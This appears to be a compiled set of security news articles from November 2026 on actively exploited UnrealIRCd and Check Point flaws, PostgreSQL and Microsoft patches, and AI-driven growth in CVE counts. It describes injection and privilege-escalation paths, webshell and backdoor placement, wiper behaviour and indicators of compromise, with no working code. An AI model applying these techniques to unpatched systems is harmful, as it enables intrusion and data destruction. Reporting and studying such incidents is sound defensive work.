articles.title: Attackers Exploit UnrealIRCd Flaw That Enables Server-Level Command Injection
articles.context: The maintainer described the vulnerability as the "most critical issue" found in UnrealIRCd over the past 15 years
articles.full_text:
The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Friday added a high-severity security flaw impacting UnrealIRCd, an open-source Internet Relay Chat (IRC) server, to its Known Exploited Vulnerabilities (KEV) catalog, following reports of active exploitation.

The vulnerability, tracked as CVE-2026-114713 (CVSS score: 8.6), is a case of improper neutralization of delimiters that could be used to execute arbitrary commands with server/IRCOp privileges.

"The labeled-response module in UnrealIRCd 6.0.0 before 6.2.7.1 does not escape the IRCv3 'label' message tag when echoing it into replies, which allows any user on a network with two or more linked servers to inject server-to-server commands that are executed with server authority," reads the description of the flaw in the NIST National Vulnerability Database (NVD).

The addition comes nearly a week after UnrealIRCd's project leader, developer, and maintainer, Bram Matthys (aka Syzop), released UnrealIRCd 6.2.7.1 to address multiple security vulnerabilities identified with the help of artificial intelligence, including CVE-2026-114713.

"We are seeing bad guys exploiting this issue on the internet right now," Matthys said. "Hopefully everyone has hot-patched or updated their server, or at the very least has the spamfilter workaround deployed. If not, do so ASAP!"

Exploitation attempts are said to have commenced a day after the release of the hotfix on November 7, 2026. That said, the exact details of the malicious activity and its end goals are presently unknown. The maintainer described the vulnerability as the "most critical issue" found in UnrealIRCd over the past 15 years.

Federal Civilian Executive Branch (FCEB) agencies have time until November 16, 2026, to apply the fixes under Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk.

articles.title: U.S. CISA adds Check Point and UnrealIRCd flaws to its Known Exploited Vulnerabilities catalog
articles.context: Threat actors are actively exploiting the vulnerability in attacks against unpatched Check Point gateways
articles.full_text:
U.S. Cybersecurity and Infrastructure Security Agency (CISA) adds Check Point and UnrealIRCd flaws to its Known Exploited Vulnerabilities catalog.

The U.S. Cybersecurity and Infrastructure Security Agency (CISA) added Check Point and UnrealIRCd vulnerabilities to its Known Exploited Vulnerabilities (KEV) catalog:

Below are the flaws added to the catalog:

CVE-2026-114713 UnrealIRCd Improper Neutralization of Delimiters Vulnerability

CVE-2026-123039 Check Point Multiple Products Incorrect Permission Assignment for Critical Resource

CVE-2026-114713 (CVSS score of 8.6) is a high-severity command injection vulnerability in UnrealIRCd, an open-source IRC server software. It affects versions from 6.0.0 up to, but not including, 6.2.7.1.

The flaw is in the labeled-response module, which fails to properly sanitize the IRCv3 label message tag when including it in server replies. An attacker can exploit this weakness to inject newlines and additional commands into server-to-server communications. On networks with at least two linked servers, even an ordinary user with no special privileges can execute commands with server-level authority. This could allow them to perform privileged IRC operations, such as disconnecting users or banning them from the network.

The UnrealIRCd maintainer confirmed that attackers were already attempting to exploit the vulnerability on the internet shortly after its disclosure. However, no specific threat group or attacker identity has been publicly identified, and there is no confirmed evidence linking the attacks to a particular campaign or financial motive. The vulnerability could be abused to gain administrative control over IRC networks, manipulate users and channels, or disrupt IRC services.

CVE-2026-123039 (CVSS score of 7.8) is a high-severity local privilege escalation vulnerability affecting Check Point Security Gateways and Security Management products. The flaw resides in the Gaia OS DynamicCLI daemon, which runs with root privileges and listens on a local, world-writable Unix socket (/tmp/dynamic_socket) without properly authenticating connecting processes. An authenticated local attacker with low privileges can exploit this weakness to execute arbitrary commands as root, gaining full control over the affected device.

Threat actors are actively exploiting the vulnerability in attacks against unpatched Check Point gateways. According to Check Point Research, attackers first gain initial access through the Mobile Access portal by exploiting the PHP2Shell vulnerabilities (CVE-2026-109618 and CVE-2026-109619), then leverage CVE-2026-123039 to escalate privileges to root. They subsequently deploy webshells and the TSGA backdoor, establish persistence, move laterally into internal networks, and, in some cases, deploy the destroy_v6 wiper to erase data on VMware ESXi hosts.

The campaign initially targeted Israeli organizations on October 30, 2026, with destructive attacks reported against some victims. A second wave on November 2 expanded to organizations across multiple countries and sectors.

Attribution remains uncertain. The malware shares code and infrastructure characteristics with PhiliKit, a framework previously associated with UNC5221, a China-linked threat actor. However, Check Point cautions that the evidence is insufficient to confidently attribute the entire campaign to this group. Possible explanations include collaboration with another actor or a false-flag operation.

According to Binding Operational Directive (BOD) 22-01: Reducing the Significant Risk of Known Exploited Vulnerabilities, FCEB agencies have to address the identified vulnerabilities by the due date to protect their networks against attacks exploiting the flaws in the catalog.

Experts also recommend that private organizations review the Catalog and address the vulnerabilities in their infrastructure.

CISA orders federal agencies to fix the two vulnerabilities by November 16, 2026.

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, CISA)

articles.title: This year’s bug count just passed 100K
articles.context: Similarly, VulnCheck found the median time from CVE publication to exploitation falling from 120 days in 2025 to 80 days during the first half of 2026
articles.full_text: Chalk up a new record for vulns. The number of Common Vulnerabilities and Exposures (CVEs) found and disclosed so far in 2026 surpassed 100,000 on Friday - more than double 2025’s total - and the reason can be summed up in two letters: AI. “It’s kind of wild,” Josh Bressers, VulnCheck’s director of coordinated vulnerability disclosure, told The Register. “The thing that almost scares the bejesus out of me is while 100K sounds like a lot, in a couple years we're going to say, remember when it was only 100K?” As of the time of our interview, about 4 pm UTC on Friday, VulnCheck counted 100,222 CVEs, he said. Microsoft alone added 1,094 security flaws to the total count on Tuesday, following 1,474 vulnerabilities the month before. “There's no denying the fact that vulnerability hunting with AI is driving a majority of what we're seeing.” All the major CVE Numbering Authorities (CNAs) - these are the organizations authorized by the CVE program to assign unique identifiers to security vulnerabilities - like VulnCheck, Microsoft, Oracle, GitHub, and other large enterprise IT vendors “are just screaming into the atmosphere right now,” Bressers said. “It’s AI.” Meanwhile, the percentage of these bugs that are exploited in the wild remains relatively consistent. About 1.4 percent (1,363) of the CVEs published this year have been added to VulnCheck’s Known Exploited Vulnerabilities (KEV) catalog. “But obviously, as the number of CVEs grows, [1 percent] of 1,000 is a lot different than [1 percent] of 100,000,” Bressers said. Plus, as other security researchers have documented, the window between the public release of a security patch and attackers developing working exploits – often by reverse engineering the patch while end users are still applying the fix – is rapidly shrinking. This is also thanks to AI. From CVE to KEV From January to June, 88 percent of the exploitation observed by CrowdStrike using public proof-of-concept (PoC) code occurred within 48 hours of the code's release. The security firm said China-linked groups such as Vault Panda and Genesis Panda moved even faster, launching attacks within 24 hours of disclosure. Similarly, VulnCheck found the median time from CVE publication to exploitation falling from 120 days in 2025 to 80 days during the first half of 2026. This window has closed even further during the second half of the year, which also seems to coincide with the AI-induced vulnpocalypse. “It’s often just hours,” Bressers said, noting 14 make-me-root vulnerabilities that VulnCheck disclosed on Friday in Copeland refrigeration controllers. Two are under active exploitation. These are the devices that Iranian hackers abused to spoil food and spark fires in supermarkets across Europe. “We published those CVEs, and literally minutes later, we were seeing hits on our honey pots,” Bressers said about the Copeland device vulnerabilities. “We’ve hit a point where with anything that looks interesting, someone is taking that information and seeing what they can do with it. Is it AI driven? Probably. It'd be hard to say it's not, because we've seen it really ramp up recently.” This influx of software bugs requires a sea change in how the entire industry approaches vulnerability disclosure and patching. “We don't have a security problem anymore,” Bressers said. “We have a data problem now. Instead of obsessing over vulnerabilities, we need to start looking at things like heat maps for infrastructure, and figure out the vulnerabilities that actually affect you. The CISA BOD helps with that.” What to prioritize in a patchpocalypse The US Cybersecurity and Infrastructure Security Agency (CISA) in June issued a cybersecurity directive that replaces flat-deadline vulnerability management policies. Instead of prioritizing patching based solely on CVSS severity scores, the directive instructs organizations to prioritize based on specific risk criteria, including whether the asset is internet-exposed, under active exploitation, and whether an attacker can automate the exploit. “It's telling people to figure out the vulnerabilities that actually affect you, and then put those at the top of the list, instead of just saying we're going to fix all the criticals,” Bressers said. AI-generated vulnerability disclosures also create huge headaches for open source software developers and maintainers, which Bressers describes as a security problem “super close to my heart.” “You've got individual developers that are drowning in vulnerability reports,” he said. “You have foundations being crushed by AI agents scraping their data or downloading their packages, millions of times a day, and it's straining the seams absolutely everywhere you look. The one thing I can say with certainty is: The way we currently do things has to change, and it's going to have to change fairly soon.” Different open source projects have taken different approaches to solving this issue. The Eclipse Foundation, which houses the Open VSX Registry, in April launched a “managed tier” for enterprise customers and other organizations running Open VSX at scale. Instead of using the free, open source version, the managed version guarantees a 99.95 percent uptime SLA backed by service credits. Its customers include AWS, IBM, Google, Cursor, and Windsurf. This paid option means commercial users who rely on the registry help fund its ongoing maintenance - and their own platforms’ security and performance. Meanwhile, curl’s maintainer, Daniel Stenberg, citing an “avalanche of vulnerability reports," updated its bug reporting rules last month. As of October 26, all low- and medium-severity reports go directly into the public GitHub repository, with only the high- and critical-flaws receiving private handling. Stenberg already shuttered curl's bug bounty program this year as AI-generated submissions piled work onto its security team. “A lot more needs to happen, and I think it is going to be a challenge to enact some of this change,” Bressers said. “When a package registry drastically changes something, people start freaking out, and the world is going to end, and people on LinkedIn are complaining - a lot of people are hesitant. No one wants to be the first to jump into the alligator-filled pool. That's one of our challenges.”®

articles.title: PostgreSQL Patches 52 Flaws, Including 22-Year-Old Bug Enabling Authenticated RCE
articles.context: " The project's security advisory describes the attacker only as someone who can create objects, without saying which privileges that takes
articles.full_text:
A type confusion flaw in PostgreSQL lets a database user who can create objects run code on the server. Updates released yesterday fix it, along with 51 other security flaws. Full protection from this flaw also requires rebuilding any C-language extensions installed on the server.

The flaw, tracked as CVE-2026-6460, has a CVSS score of 8.8. Any code run this way has the rights of the operating system user that runs PostgreSQL. All versions before 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

The PostgreSQL Global Development Group, which publishes the database's releases, has not reported any attacks using the flaw. CISA's assessment in the CVE record also lists exploitation as none.

The flaw involves composite types, which are types built from named fields, each with its own data type. A field's type can be changed while older values of that type are still held in other parts of the server.

The server could then read an old value as if it had the new type. The fix, described in the project's release notes, adds version checks so the server can detect a value that no longer matches its type.

Security researcher Mehmet Ince described a working exploit for the flaw, demonstrated on PostgreSQL 18.6, in a technical writeup published this week.

His method is to prepare a query that holds a value, change the type of one of the value's fields, and then run the query. The writeup includes the SQL that crashes an unpatched server this way and a second step that leaks memory addresses. It does not include the SQL for the final step, which makes the server run a command.

He wrote that he could "trigger this crash as a lowest-privileged login role." The project's security advisory describes the attacker only as someone who can create objects, without saying which privileges that takes.

Red Hat, which ships PostgreSQL packages, says in its CVE assessment that an attacker needs a database login with the ability to create or modify objects. None of these sources says whether an account with only default privileges can go beyond the crash to run code.

Ince traces the root of the flaw to May 5, 2004, when PostgreSQL gained the ability to change a column's type. His technique for running code relies on a later change made on May 14, 2015.

He also adapted the exploit for managed PostgreSQL services and privately shared proofs of concept with their security teams in August. The providers he worked with include AWS (Aurora and RDS), Microsoft (Azure PostgreSQL), Google (AlloyDB), Supabase, Databricks, and Ubicloud. The writeup does not give each service's current patch status.

The project credits more than a dozen reporters for CVE-2026-6460, including the researcher, and credits him on five other flaws in the same release.

The project rates 32 of the 52 flaws at 8.8, the highest score in the release. Based on the scores in its vulnerability index, only one flaw in the server requires neither a login nor any user action. That flaw, CVE-2026-116322, lets an unauthenticated client trigger a restart of PostgreSQL 18 servers.

Several other fixes are in client tools. A crafted archive can make pg_restore run code as the user running it. A compromised source server can make psql run code through the restore script in pg_dump's tar output.

What Administrators Should Do

Update the server to 18.7, 17.12, 16.16, 15.20, or 14.25, matching your major version.

Rebuild or update every C-language extension at the same time as the server. Extensions built against older releases still load, but they "may not be protected from the vulnerabilities fixed in this release," according to a repository notice from the project's RPM package maintainers. Some extensions will also need source-code changes.

Extensions rebuilt for the new releases can fail to load on older servers. Extension packages in the project's RPM repositories now require the new minor release.

If PostgreSQL runs outside its package's own service unit, for example under Patroni, restart it right after updating, a maintainer of the RPM packages says in a packaging blog post.

Update client tools such as pg_dump, pg_restore, reindexdb and vacuumdb on every machine that runs them.

Do not use the new composite_type_mismatch setting to turn off the checks. The project says doing so carries security risks.

The project's advisory and release notes offer no workaround for servers that cannot be updated yet.

PostgreSQL 14 is now end-of-life, and 14.25 is its last release. Older major versions are also affected and received no update.

After updating, follow the reindexing steps in the release announcement. If you use incremental backups, take a new full backup and base later incremental backups on it.

articles.title: November Patch Tuesday: How to Sort Through the Patches
articles.context: ” Why it matters: the first hours after Patch Tuesday are when prioritization happens, and attackers are using AI to create exploits after a patch is released faster than ever
articles.full_text:
Key Takeaways

At 1,252 CVEs this month, “patch everything now” isn’t a plan; teams need to decide what to patch first, what to test, and what to mitigate.

Know your exposure early: Qualys InstaScan flagged affected assets about 40 minutes before Microsoft’s release notes page finished loading, with no new scan.

Not every patch is safe on day one: about 35% of November patches earned a Low reliability rating from Qualys, based on public signals and telemetry from 500M+ deployed patches.

Deploy in waves: proven risky exposures first, low-impact patches on automation, and high-impact patches through pilot rings.

When a critical patch breaks, mitigate with a compensating control, then patch and retire the mitigation once a fixed update ships.

Every Patch Tuesday forces the same trade-off. Patch too slowly, and attackers get a head start on newly disclosed vulnerabilities. Patch too quickly, and a bad update can take down Exchange, break line-of-business apps, or trigger a wave of help desk tickets.

November 2026 showed both sides of that tension. Our data pointed to three lessons security and IT teams can use this month and every month:

Know your exposure before the details are public

Check whether a patch is reliable before you push it

Have a fallback when it isn’t

November at a glance

In November 2025, Microsoft addressed 63 CVEs on Patch Tuesday. In November 2026, with frontier AI models now accelerating vulnerability discovery, that number reached 1,252, nearly 20 times higher. And this isn’t an isolated month. Since April 2026, Microsoft has addressed an average of roughly 650 CVEs per month, nearly nine times the average of about 74 between November 2025 and March 2026. Each of the last three releases has addressed close to 1,000 CVEs or more.

With the same size team, manual patching can’t keep up. No team’s manual patching capacity has grown twentyfold in a year, and that gap is why speed alone isn’t enough.

The vulnerabilities worth knowing about:

Outlook NTLMv2 hash disclosure (CVE-2026-124194). This one is exploited in the wild despite a Moderate rating. Opening a crafted message file skips Outlook’s external-content warning and leaks the user’s NTLMv2 hash to an attacker-controlled server.

Exchange Server remote code execution (CVE-2026-118207). Rated Critical. An authenticated attacker with low-level access can run code on on-premises Exchange, and Microsoft rates exploitation more likely. If you run Exchange on Windows Server 2019, November hands you both problems at once: a critical Exchange flaw to close, and an OS update reported to break Exchange.

Active Directory Domain Services remote code execution (CVE-2026-118146). A crafted request from a low-privileged user could run code on domain controllers. Exploitation is rated more likely.

Recurring pressure points. Office and Outlook Preview Pane RCEs are back for a third month in a row, alongside a new zero-click Windows Search RCE and more Hyper-V escapes.

At this volume, “patch everything now” isn’t a plan. The real questions are what to patch first, what to test, and what to do when a patch can’t go out.

The three insights below answer those questions in the order they come up during a Patch Tuesday cycle: knowing your exposure as updates land, checking whether a patch is safe to deploy, and falling back to mitigation when it isn’t.

Insight 1: The faster you know your exposure, the sooner you can act

On November 10, Qualys InstaScan picked up Microsoft’s November security updates from Microsoft’s API the moment they were released. It began evaluating customer assets right away, roughly 40 minutes before Microsoft’s public release notes page finished loading. During that window, the page still showed a “{{release}}” placeholder in its title.

By the time most teams were reading the bulletin, InstaScan users already had a list of affected assets in front of them: more than 11,000 Microsoft findings in the InstaScan view, each marked “first found a few seconds ago.”

Why it matters: the first hours after Patch Tuesday are when prioritization happens, and attackers are using AI to create exploits after a patch is released faster than ever. Teams that know which assets are exposed before the details go public can plan rings, line up change windows, and flag critical systems sooner, instead of starting from a blank spreadsheet.

Note: InstaScan, powered by Qualys Agent Insta, works from the inventory and telemetry Qualys already collects, so no new scan is needed.

Find out how to eliminate risk at the source. Read the white paper.

Read More

Insight 2: Not every patch is ready on day one

As of 3 p.m. MT on November 11, about 35% of this month’s patches carried a Low reliability rating in Qualys’s AI-powered Patch Reliability Assessment. The rating combines public signals on every patch, such as vendor KBs and advisories, Linux release notes and sysadmin forums, with Qualys telemetry from more than 500 million deployed patches, including real rollback and vulnerability-reopen rates.Low reliability doesn’t mean “don’t patch.” It means “don’t patch blind.”

Example: KB5131085. Microsoft rated this cumulative update for Windows 10 / Windows Server 2019 (OS Build 17763.9487) Critical. It addresses CVE-2026-119892 and 574 other CVEs. It also earned a Low reliability rating, with two issues reported by the community:

Exchange Server deployments may see sign-in, mailbox access and mail queue failures.

USB Audio Class 1.0 devices may fail to start or lose audio output (Code 10).

For a team running Exchange on Server 2019, that’s the difference between a routine update and a messaging outage.

And it’s not an isolated case. Recent vendor-confirmed examples include a November SQL Server update (KB5129299) that can cause access violations when querying sys.dm_exec_requests during recovery, with no fix yet and a trace-flag workaround, and an October .NET Framework update for Windows 11 (KB5127694) that fails to install with error 0x800F0922 and rolls back after reboot.

No team’s manual patching capacity has grown twentyfold in a year. That gap is why speed alone isn’t enough.

What to do: deploy in waves with Agent Sara

Community signals tell you where to look; your own environment tells you whether a patch is safe. The answer isn’t one big push or one long wait. It’s sequencing.

In Qualys TruRisk Eliminate, Agent Sara builds intelligent remediation waves for you. It sorts every fix by risk, operational impact and patch reliability, then routes it to the right rollout: zero-touch first, rings for riskier patches, and patchless fixes where no patch fits.

Wave 0: Proven risky exposures. Vulnerabilities on CISA’s KEV list, publicly exposed assets, and flaws an adversary can automate to take total control. These get fixed first.

Wave 1: Low operational impact. High-reliability patches for browsers, standalone utilities and non-critical assets that don’t need a reboot. These go out with zero-touch automation.

Wave 2: High operational impact. High-reliability patches for shared runtimes, dependencies and critical assets, where reboots are expected. These go out in rings: a small, representative pilot group first, including the configurations most likely to break (for KB5131085, your Exchange servers), then broader rings once the patch holds up.

Wave 3: Beyond patching. Low-reliability patches, vulnerabilities with no patch available, and end-of-life apps. These get a mitigation instead (more on that below).

Wave 4: Uninstall. Bloatware, unused user-space apps and residual files. Removing them shrinks the attack surface for good.

The result: the riskiest exposures close first, routine patches stop needing hands-on attention, and your team spends its time on the updates that actually need judgment.

Community signals tell you where to look; your own rings tell you whether it applies to you. In Qualys TruRisk Eliminate, Agent Sara builds these remediation waves for you.

Insight 3: When a critical patch breaks, mitigate

Sometimes the pilot ring confirms the bad news: the patch breaks something you can’t live without, yet the vulnerabilities it fixes are critical. Rolling back and waiting for a fix leaves the door open. Pushing it anyway takes the business down.

There’s a third path: mitigate. Apply a compensating control that closes the attack path without installing the update, such as disabling a vulnerable service or feature, changing a registry or configuration setting, or isolating the exposed asset. Keep it in place until the vendor releases a fixed update, then patch and retire the mitigation.

In the news this week: KB5132061. Microsoft has confirmed that its November 2026 security update for Windows 11 (KB5132061) fails to install on some devices that installed the October 2026 non-security preview update (KB5127936). Affected devices may retry the installation repeatedly or return errors 0x80070306, 0x800f0989 or 0x800f0993. Microsoft says the issue will resolve automatically within 24 to 48 hours of November 11, and asks admins to contact support if it persists.

Until then, those devices are missing every fix in this month’s Windows release, and retrying won’t change that. Instead of waiting, teams can identify which devices have KB5127936 installed, apply mitigations for the most critical exposures first, such as anything on CISA’s KEV list or rated exploitation more likely, and let the November update install once Microsoft’s repair lands. Then they retire the mitigations.

The same approach works when there’s no patch at all, or when the software is end-of-life. And for bloatware and unused apps, the cleanest fix is often to uninstall them and shrink the attack surface for good.

With Qualys TruRisk Eliminate, teams can deploy those mitigations at scale from the same platform that detected the exposure, and track which assets are protected by a patch, a mitigation, or neither.

The Patch Tuesday playbook

Speed and stability aren’t opposites if each step has a clear job:

Detect early. Know which assets are exposed as soon as updates are released, not when the bulletin finishes loading.

Assess reliability. Check community signals before deployment so known breakages don’t surprise you.

Deploy in waves. Let Agent Sara sequence the rollout: riskiest exposures first, zero-touch for low-impact patches, rings for critical systems.

Mitigate when the patch breaks. If a critical patch fails in testing, close the risk with a compensating control until a fixed update is available.

Frequently Asked Questions

How should security teams prioritize patches after Patch Tuesday?

Deploy in waves. Fix proven risky exposures first, such as vulnerabilities on CISA’s KEV list and publicly exposed assets. Automate high-reliability, low-impact patches, and send high-impact patches through pilot rings.

Is it safe to deploy Patch Tuesday updates on day one?

Not always. In November 2026, about 35% of patches carried a Low reliability rating, including KB5131085, which is reported to break Exchange on Windows Server 2019. A Low rating means test first, not skip the patch.

What is a patch reliability rating?

It’s an AI-driven rating from Qualys that predicts how likely a patch is to break something in your environment before you deploy it. High reliability means deploy with confidence; Low means test, stage or delay broad rollout.

What is ring-based patch deployment?

It rolls an update out in stages, starting with a small pilot group that includes the configurations most likely to break. Once the patch holds up in your environment, it expands to broader rings.

How do I reduce risk when no patch is available or software is end-of-life?

Use a compensating control to close the attack path. For bloatware and unused apps, the cleanest fix is often to uninstall them and shrink the attack surface for good.

How can I see which assets are affected before Microsoft’s release notes are published?

Qualys InstaScan evaluates assets the moment Microsoft releases updates, with no new scan. In November 2026, it flagged affected assets about 40 minutes before Microsoft’s release notes page finished loading.

articles.title: Microsoft says November security updates cause printing issues
articles.context: Microsoft also addressed printing issues triggered by Windows updates in March and July 2025: the first caused USB printers to print random text, and the second broke the 'Print...
articles.full_text:
Microsoft warned customers earlier this week that the November 2026 security updates may break printing for documents with complex formatting.

As the company explained in a service alert seen by BleepingComputer, this known issue affects users attempting to print documents with images that have zero height or width on server (Windows Server 2016 or later) and client (Windows 10 or later) devices.

"After installing the November 2026 Windows security update (the Originating KBs listed above), or later updates, printing might fail for documents containing images rendered with a height or width value of zero at the selected printing resolution," Microsoft said.

"These images can be used as part of certain complex document formatting, such as adding "invisible" images intended to serve as a document watermark, layout anchoring, or generation tools that may inserting images objects even when no graphic present."

The bug mainly affects users printing Microsoft Word documents via the Windows Graphics Device Interface (GDI), but it may also trigger failures when printing from other applications.

Microsoft also addressed printing issues triggered by Windows updates in March and July 2025: the first caused USB printers to print random text, and the second broke the 'Print to PDF' feature.

More recently, the company notified customers that the August 2026 .NET Framework cumulative updates broke printing and PDF export in apps that use the Windows Presentation Foundation (WPF) UI framework.

This week, Microsoft also confirmed that this month's Patch Tuesday security updates trigger Windows activation and licensing failures with 0x80041008 error codes and that Windows updates released since the October Patch Tuesday cause SQL Server performance and stability issues.

Additionally, the company warned that the November 2026 Windows 11 security updates fail to install on systems with the October 2026 preview update.

articles.title: CISA Adds Two Known Exploited Vulnerabilities to Catalog
articles.context: While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog...
articles.full_text:
CISA has added two new vulnerabilities to its Known Exploited Vulnerabilities (KEV) Catalog, based on evidence of active exploitation.

CVE-2026-114713 UnrealIRCd Improper Neutralization of Delimiters Vulnerability

CVE-2026-123039 Check Point Multiple Products Incorrect Permission Assignment for Critical Resource Vulnerability

These types of vulnerabilities are a frequent attack vector for malicious cyber actors and pose significant risks to the federal enterprise.

Binding Operational Directive (BOD) 26-04: Prioritizing Security Updates Based on Risk establishes vulnerability management requirements for Federal Civilian Executive Branch (FCEB) agencies. BOD 26-04 reinforces the importance of the KEV Catalog and requires federal agencies to prioritize rapid remediation of high-risk vulnerabilities, specifically those identified by Common Vulnerabilities and Exposures (CVEs) listed in CISA’s KEV Catalog on publicly exposed assets that grant total control of the asset post-exploitation, while deferring action for lower-risk vulnerabilities. BOD 26-04 further establishes basic expectations for when agencies must check whether threat actors compromised the system before the patch was applied.

While BOD 26-04 applies only to FCEB agencies, CISA encourages all organizations to adopt risk-based vulnerability management and prioritize remediation of KEV Catalog vulnerabilities. CISA will continue to add vulnerabilities to the catalog that meet the specified criteria.

Aware of an exploited vulnerability not currently listed in the KEV Catalog? Submit it for potential addition through CISA’s KEV Nomination Form. Potential KEV additions must have a CVE ID, evidence of exploitation, and clear mitigation guidance.

articles.title: Unpatched Check Point Gateways Are Being Wiped exploiting PHP2Shell
articles.context: “Following initial access, the attacker escalated privileges from the portal service account to root by exploiting CVE-2026-123039, a local privilege-escalation vulnerability in...
articles.full_text:
Unpatched Check Point gateways were hacked worldwide, leading to root access, backdoors, network intrusion and destructive wiper attacks.

Starting on 30 October, an attacker scanned and exploited Check Point Security Gateways that hadn’t been patched, going in through the Mobile Access portal. Check Point Research describes the activity as PHP2Shell for initial access, followed by a root-level privilege escalation tracked as CVE-2026-123039. The activity began about a week after a fix became available, from an IP address ending in 130.94.19[.]204.

“We have now confirmed that, in late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways. Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619.” reads the report. “Following initial access, the attacker escalated privileges from the portal service account to root by exploiting CVE-2026-123039, a local privilege-escalation vulnerability in the DynamicCLI IPC interface. The attacker then used privileged command execution to deploy PHP webshells and establish persistence.”

There were two waves. The first, on 30 October, hit Israeli organizations, and some suffered destructive attacks. The second, on 2 November, reached organizations in several countries and sectors with no sign of destruction, and neither wave favored a particular sector. That points to opportunistic scanning, not careful targeting.

The first signs of the attack were PHP session files found in the /opt/CPcvpn-R81.20/tmp/ folder. These files contained a marker named upload_progress_pwn. The portal’s Apache and PHP processes also crashed hundreds of times, suggesting repeated attempts to exploit the vulnerability. The attacker then exploited another local flaw in the DynamicCLI interface to gain root privileges, giving them full control of the device.

With root access, the attackers installed PHP webshells in the folder used by the portal to create login pages. These files had names starting with zz and ending in .tpl. Initially, they contained simple tools for running commands. The attackers later replaced them with more advanced versions that required a hardcoded key, could execute system commands and PHP code, and supported file uploads. Uploaded files were first saved as /tmp/.up.tpl and then copied into the portal’s folder under the name challenge_render.tpl.

The attackers then installed a separate backdoor called TSGA, launched from /tmp/CPconfigdaemon. Running with root privileges, it moved itself, restarted under the name slot_CPconfigdaemon, and installed a second tool called TSProxy at /lib/libcpfwcommon.so. TSProxy was designed to run inside processes on the Check Point appliance and monitor network activity. It intercepted selected network connections used by the attackers while leaving normal network traffic unaffected.

TSGA is built for Check Point gear. It offers encrypted remote access, configuration theft, persistence through backups and snapshots, process injection and tampering with binary firewall logs. TSProxy adds encrypted proxying.

From the gateway, the attackers ran the gogo scanner to map the internal network, then moved over SSH to a VMware ESXi host using the vpxuser account. There they staged a Linux wiper, destroy_v6, and ran it. It deletes files in a target folder regardless of extension, overwrites them with zeros first unless run in fast mode, and can skip listed folders.

The wiper also leaves a note named DREAM_ANNEXATION.txt in each folder it processes. The note is politically themed, includes a timestamp, is written in Hebrew with reference to the Israeli-Palestinian conflict, and rejects ransom talks. At least nobody has to haggle.

Attribution is more difficult. TSGA and TSProxy appear to be modified versions of PhiliKit, a framework previously found in attacks against Ivanti devices and linked by ESET to UNC5221, a China-linked threat group. The tools share several unique features with PhiliKit, including code, configuration settings and encryption details. These similarities include the use of TCP port 11072 and a Unix socket at /tmp/.p_sock. TSProxy also uses the same credentials, communication secrets, TLS certificate and private key as a PhiliKit component called libdssafe.so.

Other findings also suggest a possible connection to Chinese threat actors. The gogo network scanner has previously been associated with China-linked groups, while the attackers used LightNode VPS servers, a hosting provider also used by these actors. The scanning activity took place between 00:00 and 09:00 UTC, corresponding to normal working hours in China (08:00 to 17:00).

However, some aspects of the operation do not match UNC5221’s known activity and objectives. These include the destructive attacks, the focus on Israeli organizations, the Hebrew-language message left by the wiper and the malware name, which appears to reference the word “Philistine”.

Check Point says several explanations are possible. UNC5221 may have carried out the entire operation, or it may have provided initial access to another threat actor. The attackers could also have deliberately left clues to mislead investigators. Another possibility is that the destructive attacks were intended to hide a different objective.

The note uses the Dream Security brand, and Dream recently published research on PHP2Shell attacks on Palo Alto Networks devices by China-nexus actors. That timing raises the possibility of retaliation, but the evidence doesn’t establish a clear motive.

“Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation. Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation.” concludes the report. “It is also possible that the destructive activity served as a smoke screen.”

Follow me on Twitter: @securityaffairs and Facebook and Mastodon

Pierluigi Paganini

(SecurityAffairs – hacking, PHP2Shell)

articles.title: Check Point warns of zero-day flaw exploited for root access
articles.context: In a separate report, Check Point said the attackers first gained access to the Mobile Access portal by exploiting the PHP2Shell vulnerability, then escalated privileges to root...
articles.full_text:
Check Point Software has released emergency hotfixes to address a high-severity flaw that hackers have been exploiting to gain root privileges and establish persistence on vulnerable devices since late October.

Tracked as CVE-2026-123039, this local privilege escalation vulnerability was found in the DynamicCLI IPC (Inter-Process Communication) interface used to send privileged command requests to the root-level Gaia OS DynamicCLI (dynamic_server) daemon.

"Check Point observed an active exploit of this vulnerability against a couple of dozen customers," the company warned in a Thursday security advisory.

"The Gaia OS DynamicCLI daemon runs as root and listens on a world-writable local socket (/tmp/dynamic_socket) without authenticating connecting processes. An authenticated local user can send a command to the socket and have it executed as root."

The list of Check Point products vulnerable to attacks exploiting the CVE-2026-123039 flaw includes the company's Firewall, Multi-Domain Security Management Server, Scalable Platforms, Security Gateway, and Security Management Server.

In a separate report, Check Point said the attackers first gained access to the Mobile Access portal by exploiting the PHP2Shell vulnerability, then escalated privileges to root using CVE-2026-123039 zero-day exploits.

Next, the threat actors dropped webshells and installed TSGA backdoor and TSProxy malware that was previously spotted while investigating attacks targeting Ivanti appliances, then pivoted from the compromised gateway to a VMware ESXi host and deployed destructive wiper malware.

Check Point advised security teams who can't immediately deploy the CVE-2026-123039 hotfixes to stop the dynamic_server process and prevent it from restarting as a temporary mitigation measure.

The company also shared indicators of compromise (IOCs), and it said that customers can find evidence of compromise by checking for commands commonly associated with exploitation attempts, the use of the system() sink (uncommon or absent in legitimate traffic), and commands that don't use the default Clish wrapper (indicating that it was executed as root through the socket and requires further investigation).

In September, Check Point warned customers that attackers had been exploiting two other critical Security Management Server (CVE-2026-93616) and Security Gateway (CVE-2026-85102) remote code execution (RCE) vulnerabilities in zero-day attacks that didn't require privileges on the targeted systems.

Over the last two years, the US Cybersecurity and Infrastructure Security Agency (CISA) has added five Check Point flaws to its catalog of actively exploited vulnerabilities, two of which have also been abused by ransomware gangs.

articles.title: Citrix Patches 10 Critical NetScaler Vulnerabilities
articles.context: Citrix on Thursday announced patches for 28 vulnerabilities in NetScaler ADC and NetScaler Gateway, including nine critical-severity bugs
articles.full_text:
Citrix on Thursday announced patches for 28 vulnerabilities in NetScaler ADC and NetScaler Gateway, including nine critical-severity bugs.

